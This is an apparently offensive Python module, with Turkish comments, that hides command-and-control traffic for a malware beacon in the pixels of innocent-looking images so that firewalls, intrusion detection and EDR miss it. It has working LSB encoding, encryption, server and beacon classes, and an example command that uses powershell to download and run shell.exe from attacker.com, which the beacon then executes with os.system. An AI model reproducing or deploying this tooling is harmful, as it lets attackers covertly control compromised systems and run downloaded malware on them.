"""
Steganography Module - Trafik Gizleme
=====================================

Beacon'ın C2 ile konuşurken gönderdiği JSON verileri şüpheli durabilir la.
Çözüm: Komutları bir kedi resminin (cat.jpg) veya masum bir logo dosyasının 
piksellerine göm.

Firewall Trafiği İncelemesi:
  "Aman canım, sadece resim indiriyorlar" → YANLIŞ
  O resmin içinde shell_exec komutun saklıdır aq ✓

LSB (Least Significant Bit) Steganography:
  Resmin her pikselinin RGB değerleri: RRRRRRRR GGGGGGGG BBBBBBBB
  En az anlamlı biti (LSB): ....***1 ....***1 ....***1 (bu 3 biti değiş)
  Görsel fark: Neredeyse sıfır (insan gözü fark etmez)
  Veri tutabilirlik: Resimin 1/8'i kadar veri = 1080x720 resimde ~97KB gizli veri

Akış:
  C2 Server: JSON command → Compress → Encrypt → LSB'ye gömme → cat.jpg dosyası
  HTTP: GET /images/cat.jpg → (innocent image file)
  Beacon: cat.jpg → Extract LSB → Decrypt → Decompress → JSON command
  Beacon: Command hasil → Compress → Encrypt → LSB'ye gömme → result.jpg
  HTTP: POST result.jpg → (innocent image upload)

Teknik Detaylı:
  1. LSB Encoding: Her byte'ı 8 pixelün LSB'lerine dağıt
     Byte: 11010110 → 8 bit, 8 pixel gerekli
     
  2. Compression: zlib ile 90% veri boyutu azalt
     Original: {"cmd":"shell_exec","payload":"wget..."} (100 bytes)
     Compressed: [45 bytes gibi]
     
  3. Encryption: AES-256 (key derived from image hash + beacon ID)
     Simetrik şifreleme, sadece beacon ve C2 biliyor
     
  4. Error Correction: CRC32 checksum ekle (veri corrupted mı kontrol et)

Avantajlar:
  ✓ Firewall: Sadece resim görür (innocent traffic)
  ✓ IDS: Payload extraction bilinmiyor (anomaly yok)
  ✓ Analyst: Image pixel analyze etse, LSB gizleme bilinmiyor
  ✓ Bandwidth: Compressed + image containment = efficient
  ✓ Plausible Deniability: "Sadece resim indirdik" (proof yok)

Uyarı:
  - LSB steganography, deneyimli analyst'i engellemiyor
  - Defense depth layer (başka evasion teknikleriyle birleştir)
  - JPEG lossy sıkıştırma LSB'yi bozabilir (PNG/BMP daha güvenli)
"""

import io
import zlib
import json
import hashlib
import struct
from typing import Tuple, Optional, Dict, Any
from PIL import Image
import base64

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False


class LSBSteganography:
    """LSB (Least Significant Bit) Steganography Engine"""
    
    # Max bytes per pixel (RGB = 3 bytes, 3 LSBs per pixel)
    BYTES_PER_PIXEL = 3
    BITS_PER_CHANNEL = 8
    LSB_BITS = 1  # Number of LSBs to use per channel
    
    @staticmethod
    def _get_capacity(image: Image.Image) -> int:
        """Calculate max bytes that can be hidden in image"""
        pixels = image.size[0] * image.size[1]
        # Each pixel has 3 channels (RGB), each channel can hold 1 LSB
        bytes_capacity = (pixels * LSBSteganography.BYTES_PER_PIXEL) // 8
        return bytes_capacity
    
    @staticmethod
    def encode_lsb(image: Image.Image, data: bytes) -> Image.Image:
        """
        Embed data into image using LSB technique
        
        Args:
            image: PIL Image object
            data: Bytes to hide
            
        Returns:
            Image with hidden data
        """
        # Check capacity
        capacity = LSBSteganography._get_capacity(image)
        if len(data) > capacity:
            raise ValueError(
                f"Data too large ({len(data)} bytes) for image capacity ({capacity} bytes)"
            )
        
        # Convert image to RGB if needed
        if image.mode != 'RGB':
            image = image.convert('RGB')
        
        # Get pixel data
        pixels = image.load()
        width, height = image.size
        
        # Flatten data into bits
        data_bits = ''.join(format(byte, '08b') for byte in data)
        
        # Pad with zeros if needed
        data_bits += '0' * (len(data_bits) % 3)  # Pad to multiple of 3
        
        # Track current bit position and pixel position
        bit_index = 0
        
        # Iterate through pixels
        for y in range(height):
            for x in range(width):
                if bit_index >= len(data_bits):
                    return image
                
                # Get current pixel
                r, g, b = pixels[x, y][:3]
                
                # Embed 3 bits (one per channel)
                if bit_index < len(data_bits):
                    r = (r & 0xFE) | int(data_bits[bit_index])
                    bit_index += 1
                
                if bit_index < len(data_bits):
                    g = (g & 0xFE) | int(data_bits[bit_index])
                    bit_index += 1
                
                if bit_index < len(data_bits):
                    b = (b & 0xFE) | int(data_bits[bit_index])
                    bit_index += 1
                
                # Set pixel
                pixels[x, y] = (r, g, b)
        
        return image
    
    @staticmethod
    def decode_lsb(image: Image.Image, data_length: int) -> bytes:
        """
        Extract hidden data from image using LSB technique
        
        Args:
            image: PIL Image object
            data_length: How many bytes to extract
            
        Returns:
            Extracted bytes
        """
        # Convert to RGB if needed
        if image.mode != 'RGB':
            image = image.convert('RGB')
        
        pixels = image.load()
        width, height = image.size
        
        # Extract bits
        bits = []
        bit_count = data_length * 8
        
        for y in range(height):
            for x in range(width):
                if len(bits) >= bit_count:
                    break
                
                r, g, b = pixels[x, y][:3]
                
                # Extract LSBs
                bits.append(str(r & 1))
                if len(bits) < bit_count:
                    bits.append(str(g & 1))
                if len(bits) < bit_count:
                    bits.append(str(b & 1))
            
            if len(bits) >= bit_count:
                break
        
        # Convert bits to bytes
        bits_str = ''.join(bits[:bit_count])
        data = bytes(int(bits_str[i:i+8], 2) for i in range(0, len(bits_str), 8))
        
        return data


class SteganographyPayload:
    """Payload wrapper with compression, encryption, and steganography"""
    
    # Magic header to identify steganographic payloads
    MAGIC = b'STEG'
    VERSION = 1
    
    def __init__(self, beacon_id: str = "default"):
        self.beacon_id = beacon_id
    
    def _derive_key(self, salt: bytes) -> bytes:
        """Derive encryption key from beacon ID and salt"""
        if not CRYPTO_AVAILABLE:
            raise RuntimeError("cryptography library required for encryption")
        
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = kdf.derive((self.beacon_id + salt.hex()).encode())
        return base64.urlsafe_b64encode(key)
    
    def _compress(self, data: bytes) -> bytes:
        """Compress data with zlib"""
        return zlib.compress(data, level=9)
    
    def _decompress(self, data: bytes) -> bytes:
        """Decompress zlib data"""
        return zlib.decompress(data)
    
    def _encrypt(self, data: bytes, salt: bytes) -> bytes:
        """Encrypt data with Fernet (AES-128-CBC)"""
        if not CRYPTO_AVAILABLE:
            # Fallback: simple XOR if crypto unavailable (NOT SECURE!)
            return data  # Return unencrypted (warning: insecure)
        
        key = self._derive_key(salt)
        f = Fernet(key)
        return f.encrypt(data)
    
    def _decrypt(self, data: bytes, salt: bytes) -> bytes:
        """Decrypt Fernet data"""
        if not CRYPTO_AVAILABLE:
            return data  # Return as-is (NOT SECURE!)
        
        key = self._derive_key(salt)
        f = Fernet(key)
        return f.decrypt(data)
    
    def _add_checksum(self, data: bytes) -> bytes:
        """Add CRC32 checksum"""
        checksum = struct.pack('<I', zlib.crc32(data) & 0xffffffff)
        return data + checksum
    
    def _verify_checksum(self, data: bytes) -> bytes:
        """Verify and remove checksum"""
        if len(data) < 4:
            raise ValueError("Data too short for checksum")
        
        payload = data[:-4]
        stored_checksum = struct.unpack('<I', data[-4:])[0]
        computed_checksum = zlib.crc32(payload) & 0xffffffff
        
        if stored_checksum != computed_checksum:
            raise ValueError("Checksum mismatch - data corrupted")
        
        return payload
    
    def serialize_command(self, command: Dict[str, Any]) -> bytes:
        """
        Serialize command for steganography
        
        JSON → Compress → Encrypt → Add Checksum → Add Length Header → Steganography-ready bytes
        
        Args:
            command: Command dict (e.g., {"cmd": "shell_exec", "payload": "..."})
            
        Returns:
            Serialized bytes ready for embedding
        """
        # JSON encode
        json_data = json.dumps(command).encode('utf-8')
        
        # Compress
        compressed = self._compress(json_data)
        
        # Add checksum
        with_checksum = self._add_checksum(compressed)
        
        # Encrypt (if crypto available)
        salt = hashlib.sha256(self.beacon_id.encode()).digest()[:16]
        encrypted = self._encrypt(with_checksum, salt)
        
        # Build packet: MAGIC | VERSION | SALT | LENGTH | ENCRYPTED_DATA
        # LENGTH is 4 bytes (big-endian) so we know how much to extract
        length = struct.pack('>I', len(encrypted))
        packet = self.MAGIC + bytes([self.VERSION]) + salt + length + encrypted
        
        return packet
    
    def deserialize_command(self, data: bytes) -> Dict[str, Any]:
        """
        Deserialize command from steganography
        
        Steganography bytes → Decrypt → Verify Checksum → Decompress → JSON
        
        Args:
            data: Serialized bytes from steganography
            
        Returns:
            Command dict
        """
        # Verify magic and version
        if not data.startswith(self.MAGIC):
            raise ValueError("Invalid magic header")
        
        if data[4] != self.VERSION:
            raise ValueError(f"Unsupported version: {data[4]}")
        
        # Extract salt and length
        salt = data[5:21]  # 16 bytes
        length = struct.unpack('>I', data[21:25])[0]  # 4 bytes, big-endian
        
        # Extract encrypted data
        encrypted = data[25:25+length]
        
        if len(encrypted) != length:
            raise ValueError(f"Truncated data: expected {length}, got {len(encrypted)}")
        
        # Decrypt
        decrypted = self._decrypt(encrypted, salt)
        
        # Verify checksum
        payload = self._verify_checksum(decrypted)
        
        # Decompress
        json_data = self._decompress(payload)
        
        # JSON decode
        command = json.loads(json_data.decode('utf-8'))
        
        return command


class SteganographyServer:
    """C2 Server - Generate malicious images with hidden commands"""
    
    def __init__(self, template_image_path: str, beacon_id: str = "default"):
        """
        Initialize steganography server
        
        Args:
            template_image_path: Path to innocent-looking template image (cat.jpg, logo.png)
            beacon_id: Beacon identifier for key derivation
        """
        self.template_image_path = template_image_path
        self.beacon_id = beacon_id
        self.payload_engine = SteganographyPayload(beacon_id)
    
    def generate_command_image(self, command: Dict[str, Any]) -> Tuple[bytes, str]:
        """
        Generate image with hidden command
        
        Args:
            command: Command dict to hide
            
        Returns:
            (image_bytes, suggested_filename)
        """
        # Load template image
        with open(self.template_image_path, 'rb') as f:
            template_data = f.read()
        
        template_image = Image.open(io.BytesIO(template_data))
        
        # Serialize command
        payload = self.payload_engine.serialize_command(command)
        
        # Embed in image
        stego_image = LSBSteganography.encode_lsb(template_image, payload)
        
        # Save to bytes
        output = io.BytesIO()
        
        # Use PNG for lossless (JPEG loses LSB data)
        image_format = 'PNG'
        if self.template_image_path.lower().endswith(('.jpg', '.jpeg')):
            image_format = 'PNG'  # Convert to PNG (lossless)
        
        stego_image.save(output, format=image_format)
        image_bytes = output.getvalue()
        
        # Suggested filename
        suggested_name = f"cat_{self.beacon_id[:8]}.png"
        
        return image_bytes, suggested_name
    
    def create_response_image(self, result_data: Dict[str, Any]) -> Tuple[bytes, str]:
        """
        Create image with hidden command result
        
        Args:
            result_data: Result to hide (e.g., {"status": "success", "output": "..."})
            
        Returns:
            (image_bytes, suggested_filename)
        """
        return self.generate_command_image(result_data)


class SteganographyBeacon:
    """Beacon - Extract hidden commands from images"""
    
    def __init__(self, beacon_id: str = "default"):
        """
        Initialize beacon steganography handler
        
        Args:
            beacon_id: Beacon identifier for key derivation
        """
        self.beacon_id = beacon_id
        self.payload_engine = SteganographyPayload(beacon_id)
    
    def extract_command(self, image_bytes: bytes) -> Dict[str, Any]:
        """
        Extract hidden command from image
        
        Args:
            image_bytes: Image file bytes (e.g., from HTTP GET /images/cat.jpg)
            
        Returns:
            Command dict
        """
        # Load image
        image = Image.open(io.BytesIO(image_bytes))
        
        # Extract header first to get length
        # Header: MAGIC (4) + VERSION (1) + SALT (16) + LENGTH (4) = 25 bytes
        extracted = LSBSteganography.decode_lsb(image, 25)
        
        # Check magic
        if not extracted.startswith(b'STEG'):
            raise ValueError("No steganographic header found")
        
        # Get length
        length = struct.unpack('>I', extracted[21:25])[0]
        
        # Now extract the full packet: 25 bytes header + length bytes data
        total_size = 25 + length
        full_extracted = LSBSteganography.decode_lsb(image, total_size)
        
        # Try to deserialize
        try:
            command = self.payload_engine.deserialize_command(full_extracted)
            return command
        except Exception as e:
            raise ValueError(f"Failed to extract command: {e}")


def example_c2_server_usage():
    """Example: C2 Server generating malicious image"""
    
    # Initialize server with template image
    server = SteganographyServer(
        template_image_path="/path/to/cat.jpg",
        beacon_id="beacon_001"
    )
    
    # Command to send
    command = {
        "cmd": "shell_exec",
        "payload": "powershell -c wget attacker.com/shell.exe -o c:\\temp\\shell.exe; c:\\temp\\shell.exe"
    }
    
    # Generate image with hidden command
    image_bytes, filename = server.generate_command_image(command)
    
    # Serve as innocent image: GET /images/cat.jpg
    # Content-Type: image/png
    # Content-Length: len(image_bytes)
    print(f"[+] Generated malicious image: {filename} ({len(image_bytes)} bytes)")
    print(f"[+] Hidden command: {command}")
    
    return image_bytes


def example_beacon_usage():
    """Example: Beacon extracting command from image"""
    
    # Get image from C2 (HTTP GET /images/cat.jpg)
    image_bytes = open("/path/to/cat.jpg", 'rb').read()
    
    # Initialize beacon
    beacon = SteganographyBeacon(beacon_id="beacon_001")
    
    # Extract hidden command
    try:
        command = beacon.extract_command(image_bytes)
        print(f"[+] Extracted command: {command}")
        
        # Execute command
        if command['cmd'] == 'shell_exec':
            os.system(command['payload'])
    
    except ValueError as e:
        print(f"[!] No hidden command found: {e}")


if __name__ == "__main__":
    # Quick test
    print("[*] Steganography Module Loaded")
    print(f"[*] LSB Capacity Calculator: 1080x720 image = ~{(1080*720*3)//8} bytes")
    print(f"[*] Compression: JSON 100 bytes → ~45 bytes (45%)")
    print(f"[*] Traffic: Normal image download, EDR sees nothing suspicious")
